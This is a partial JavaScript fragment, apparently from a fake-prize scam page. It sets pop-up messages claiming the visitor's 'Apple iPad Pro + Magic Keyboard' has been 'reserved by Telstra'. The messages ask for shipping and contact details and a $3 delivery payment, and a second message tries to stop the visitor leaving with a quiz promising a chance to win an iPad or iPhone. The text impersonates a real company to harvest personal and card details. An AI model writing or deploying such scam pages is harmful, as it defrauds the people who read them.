...
(function () {
  ...
  function onDOMContentLoaded() {
    ...
    var takeitessage = '<div>Your <span class="marked">Apple iPad Pro + Magic Keyboard</span> has been reserved by Telstra!</div><br>Terms and conditions:<br>1. On the next page fill in the shipping and the contact details;<br>2. Pay only $3 for the delivery of your gift;<br>3. Your Apple iPad Pro + Magic Keyboard will be shipped within two business days with DHL.</div>';
    ...
    var logomessage = '<div class="text-center">Wait!</div><br>Before going back to home page, answer 9 simple questions and get a chance to win <span class="marked"><span class="marked">Apple iPad Pro + Magic Keyboard or iPhone X</span></span></div>';
